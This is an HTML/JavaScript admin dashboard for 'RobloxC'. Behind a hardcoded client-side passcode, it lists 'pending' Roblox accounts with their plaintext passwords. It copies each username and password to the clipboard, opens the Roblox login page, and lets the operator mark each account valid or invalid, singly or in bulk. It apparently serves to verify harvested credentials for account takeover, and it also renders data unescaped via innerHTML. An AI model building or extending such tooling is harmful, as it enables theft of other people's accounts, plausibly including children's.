<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RobloxC | Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #000000; color: #ffffff; }
        .bg-card { background-color: #1a1a1a; }
        .border-subtle { border-color: #333333; }
        .text-muted { color: #888888; }
        
        /* Passcode Gate Style */
        #passcode-gate { background-color: #000000; z-index: 9999; }
        .passcode-input { background: transparent; border-bottom: 2px solid #333; font-size: 2rem; width: 200px; text-align: center; letter-spacing: 0.5rem; outline: none; }
        .passcode-input:focus { border-bottom-color: #fff; }

        /* Slider Panel Style */
        #slider-panel { position: fixed; top: 0; right: -100%; width: 100%; height: 100%; background: #000; z-index: 1000; transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        #slider-panel.open { right: 0; }
        @media (min-width: 768px) { #slider-panel { width: 400px; } }
        
        .slide-container { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; height: calc(100% - 60px); }
        .slide { min-width: 100%; scroll-snap-align: start; padding: 20px; overflow-y: auto; }
        .slide::-webkit-scrollbar { display: none; }
        
        .account-item { border-bottom: 1px solid #222; padding: 12px 0; }
        .account-item:last-child { border-bottom: none; }
        
        /* Custom Checkbox */
        .custom-checkbox { width: 18px; height: 18px; border: 2px solid #444; border-radius: 4px; display: inline-block; cursor: pointer; position: relative; }
        .custom-checkbox.checked { background-color: #fff; border-color: #fff; }
        .custom-checkbox.checked::after { content: '\2713'; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #000; font-size: 12px; }

        /* Confirmation Modal */
        #confirm-modal { z-index: 2000; }
        
        /* Utility */
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="min-h-screen">

    <!-- PASSCODE GATE -->
    <div id="passcode-gate" class="fixed inset-0 flex flex-col items-center justify-center">
        <div class="mb-8 text-center">
            <h1 class="text-xl font-bold mb-2">ACCESS REQUIRED</h1>
            <p class="text-muted text-sm">Enter passcode to continue</p>
        </div>
        <input type="password" id="passcode-field" class="passcode-input mb-4" maxlength="6" autofocus>
        <p id="passcode-error" class="text-red-500 text-xs opacity-0">Invalid Passcode</p>
    </div>

    <!-- MAIN DASHBOARD -->
    <div id="main-content" class="hidden flex flex-col min-h-screen">
        <!-- Header -->
        <header class="p-6 border-b border-subtle flex items-center justify-between">
            <div>
                <h1 class="text-lg font-bold">ROBLOXC ADMIN</h1>
                <div class="flex items-center gap-2 mt-1">
                    <span class="w-2 h-2 bg-green-500 rounded-full"></span>
                    <span id="active-admins" class="text-xs text-muted">1 Admin Active</span>
                </div>
            </div>
            <button id="open-slider" class="w-10 h-10 flex items-center justify-center rounded-full border border-subtle hover:bg-white hover:text-black transition-all">
                <i class="fas fa-chevron-right"></i>
            </button>
        </header>

        <!-- Content -->
        <main class="flex-1 p-6 max-w-4xl mx-auto w-full">
            <h2 class="text-sm font-semibold text-muted uppercase tracking-widest mb-6">Pending Accounts</h2>
            
            <div id="pending-container" class="space-y-4">
                <!-- Accounts will be loaded here -->
                <div class="animate-pulse flex space-x-4">
                    <div class="flex-1 space-y-4 py-1">
                        <div class="h-4 bg-zinc-800 rounded w-3/4"></div>
                        <div class="space-y-2">
                            <div class="h-4 bg-zinc-800 rounded"></div>
                            <div class="h-4 bg-zinc-800 rounded w-5/6"></div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- SLIDER PANEL -->
    <div id="slider-panel">
        <div class="flex items-center justify-between p-4 border-b border-subtle">
            <div class="flex gap-4 text-xs font-bold">
                <button onclick="scrollToSlide(0)" class="slide-tab opacity-100">ALL</button>
                <button onclick="scrollToSlide(1)" class="slide-tab opacity-50">VALID</button>
                <button onclick="scrollToSlide(2)" class="slide-tab opacity-50">INVALID</button>
            </div>
            <div class="flex items-center gap-3">
                <button id="bulk-menu-btn" class="text-muted hover:text-white"><i class="fas fa-ellipsis-v"></i></button>
                <button id="close-slider" class="text-muted hover:text-white"><i class="fas fa-times"></i></button>
            </div>
        </div>

        <!-- Bulk Action Menu -->
        <div id="bulk-menu" class="hidden absolute top-14 right-10 bg-zinc-900 border border-subtle p-2 rounded shadow-xl z-50">
            <button onclick="bulkUpdate('valid')" class="block w-full text-left px-4 py-2 text-xs hover:bg-zinc-800">Set as Valid</button>
            <button onclick="bulkUpdate('invalid')" class="block w-full text-left px-4 py-2 text-xs hover:bg-zinc-800">Set as Invalid</button>
        </div>

        <div class="slide-container no-scrollbar" id="slide-container">
            <!-- Slide 1: All -->
            <div class="slide" id="slide-all">
                <div class="space-y-2" id="list-all"></div>
            </div>
            <!-- Slide 2: Valid -->
            <div class="slide" id="slide-valid">
                <div class="space-y-2" id="list-valid"></div>
            </div>
            <!-- Slide 3: Invalid -->
            <div class="slide" id="slide-invalid">
                <div class="space-y-2" id="list-invalid"></div>
            </div>
        </div>
    </div>

    <!-- CONFIRMATION MODAL -->
    <div id="confirm-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center p-6">
        <div class="bg-card border border-subtle p-8 rounded-lg max-w-sm w-full text-center">
            <h3 class="text-lg font-bold mb-4">Are you sure?</h3>
            <div class="flex gap-4">
                <button id="confirm-yes" class="flex-1 bg-white text-black font-bold py-3 rounded">YES</button>
                <button id="confirm-no" class="flex-1 border border-subtle font-bold py-3 rounded">NO</button>
            </div>
        </div>
    </div>

    <script>
        // State
        const CORRECT_PASSCODE = "110312";
        let pendingAccounts = [];
        let selectedIds = new Set();
        let currentConfirmAction = null;

        // Elements
        const passcodeGate = document.getElementById('passcode-gate');
        const passcodeField = document.getElementById('passcode-field');
        const passcodeError = document.getElementById('passcode-error');
        const mainContent = document.getElementById('main-content');
        const pendingContainer = document.getElementById('pending-container');
        const sliderPanel = document.getElementById('slider-panel');
        const slideContainer = document.getElementById('slide-container');
        const bulkMenu = document.getElementById('bulk-menu');
        const confirmModal = document.getElementById('confirm-modal');

        // Passcode Logic
        passcodeField.addEventListener('input', (e) => {
            if (e.target.value.length === 6) {
                if (e.target.value === CORRECT_PASSCODE) {
                    passcodeGate.classList.add('hidden');
                    mainContent.classList.remove('hidden');
                    initDashboard();
                } else {
                    passcodeError.style.opacity = '1';
                    e.target.value = '';
                }
            } else {
                passcodeError.style.opacity = '0';
            }
        });

        // Dashboard Initialization
        function initDashboard() {
            loadPending();
            setInterval(loadPending, 5000);
            setInterval(updatePresence, 10000);
            updatePresence();
        }

        async function updatePresence() {
            try {
                const res = await fetch('/api/admin/heartbeat', { method: 'POST' });
                const data = await res.json();
                document.getElementById('active-admins').innerText = `${data.activeAdmins} Admin${data.activeAdmins > 1 ? 's' : ''} Active`;
            } catch (e) {}
        }

        async function loadPending() {
            try {
                const res = await fetch('/api/accounts/pending');
                pendingAccounts = await res.json();
                renderPending();
            } catch (e) {
                console.error(e);
            }
        }

        function renderPending() {
            if (pendingAccounts.length === 0) {
                pendingContainer.innerHTML = '<p class="text-muted italic text-sm">No pending accounts found.</p>';
                return;
            }

            pendingContainer.innerHTML = pendingAccounts.map(acc => `
                <div class="bg-card border border-subtle rounded-lg p-4 transition-all" id="acc-${acc.id}">
                    <div class="flex items-center justify-between">
                        <div>
                            <p class="font-mono text-sm">${acc.username}</p>
                            <p class="text-[10px] text-muted mt-1 uppercase">Pending Validation</p>
                        </div>
                        <button onclick="processAccount('${acc.id}')" class="px-6 py-2 bg-white text-black text-xs font-bold rounded hover:bg-zinc-200 transition-colors">
                            PROCESS
                        </button>
                    </div>
                    <div id="detail-${acc.id}" class="hidden mt-4 pt-4 border-t border-subtle">
                        <div class="grid grid-cols-2 gap-4 mb-4">
                            <div>
                                <p class="text-[10px] text-muted uppercase">Username</p>
                                <p class="text-sm font-mono">${acc.username}</p>
                            </div>
                            <div>
                                <p class="text-[10px] text-muted uppercase">Password</p>
                                <p class="text-sm font-mono">${acc.password}</p>
                            </div>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="confirmStatus('${acc.id}', 'valid')" class="flex-1 py-2 border border-green-900/50 text-green-500 text-[10px] font-bold rounded hover:bg-green-500 hover:text-black transition-all">VALID</button>
                            <button onclick="confirmStatus('${acc.id}', 'invalid')" class="flex-1 py-2 border border-red-900/50 text-red-500 text-[10px] font-bold rounded hover:bg-red-500 hover:text-black transition-all">INVALID</button>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        window.processAccount = function(id) {
            const acc = pendingAccounts.find(a => a.id === id);
            if (!acc) return;

            // Copy to clipboard
            const textToCopy = `Username: ${acc.username}\nPassword: ${acc.password}`;
            navigator.clipboard.writeText(textToCopy);

            // Open Roblox
            window.open('https://www.roblox.com/login', '_blank');

            // Show details
            document.getElementById(`detail-${id}`).classList.remove('hidden');
            const btn = document.querySelector(`#acc-${id} button`);
            if (btn) btn.innerText = 'CONFIGURING...';
        };

        window.confirmStatus = function(id, status) {
            currentConfirmAction = () => updateStatus(id, status);
            confirmModal.classList.remove('hidden');
        };

        async function updateStatus(id, status) {
            try {
                const res = await fetch('/api/accounts/status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ids: [id], status })
                });
                if (res.ok) {
                    loadPending();
                    if (sliderPanel.classList.contains('open')) loadSliderData();
                }
            } catch (e) {}
        }

        // Slider Logic
        document.getElementById('open-slider').onclick = () => {
            sliderPanel.classList.add('open');
            loadSliderData();
        };

        document.getElementById('close-slider').onclick = () => {
            sliderPanel.classList.remove('open');
            bulkMenu.classList.add('hidden');
        };

        document.getElementById('bulk-menu-btn').onclick = () => {
            bulkMenu.classList.toggle('hidden');
        };

        async function loadSliderData() {
            const [all, valid, invalid] = await Promise.all([
                fetch('/api/accounts/all').then(r => r.json()),
                fetch('/api/accounts/valid').then(r => r.json()),
                fetch('/api/accounts/invalid').then(r => r.json())
            ]);

            renderList('list-all', all);
            renderList('list-valid', valid);
            renderList('list-invalid', invalid);
        }

        function renderList(containerId, accounts) {
            const container = document.getElementById(containerId);
            if (accounts.length === 0) {
                container.innerHTML = '<p class="text-muted text-xs italic">Empty</p>';
                return;
            }

            container.innerHTML = accounts.map(acc => `
                <div class="account-item flex items-center gap-3">
                    <div class="custom-checkbox ${selectedIds.has(acc.id) ? 'checked' : ''}" onclick="toggleSelect('${acc.id}', this)"></div>
                    <div class="flex-1 overflow-hidden">
                        <p class="text-xs font-mono truncate">${acc.username}</p>
                        <p class="text-[8px] text-muted uppercase">${acc.status} • ${new Date(acc.added_at?._seconds * 1000 || Date.now()).toLocaleDateString()}</p>
                    </div>
                </div>
            `).join('');
        }

        window.toggleSelect = function(id, el) {
            if (selectedIds.has(id)) {
                selectedIds.delete(id);
                el.classList.remove('checked');
            } else {
                selectedIds.add(id);
                el.classList.add('checked');
            }
        };

        window.bulkUpdate = function(status) {
            if (selectedIds.size === 0) return;
            currentConfirmAction = async () => {
                try {
                    await fetch('/api/accounts/status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ids: Array.from(selectedIds), status })
                    });
                    selectedIds.clear();
                    bulkMenu.classList.add('hidden');
                    loadSliderData();
                    loadPending();
                } catch (e) {}
            };
            confirmModal.classList.remove('hidden');
        };

        window.scrollToSlide = (index) => {
            const width = slideContainer.offsetWidth;
            slideContainer.scrollTo({ left: width * index, behavior: 'smooth' });
            
            // Update tabs
            document.querySelectorAll('.slide-tab').forEach((tab, i) => {
                tab.style.opacity = i === index ? '1' : '0.5';
            });
        };

        // Confirmation Modal Logic
        document.getElementById('confirm-yes').onclick = async () => {
            if (currentConfirmAction) await currentConfirmAction();
            confirmModal.classList.add('hidden');
            currentConfirmAction = null;
        };

        document.getElementById('confirm-no').onclick = () => {
            confirmModal.classList.add('hidden');
            currentConfirmAction = null;
        };

        // Handle horizontal scroll to update tabs
        slideContainer.addEventListener('scroll', () => {
            const index = Math.round(slideContainer.scrollLeft / slideContainer.offsetWidth);
            document.querySelectorAll('.slide-tab').forEach((tab, i) => {
                tab.style.opacity = i === index ? '1' : '0.5';
            });
        });
    </script>
</body>
</html>
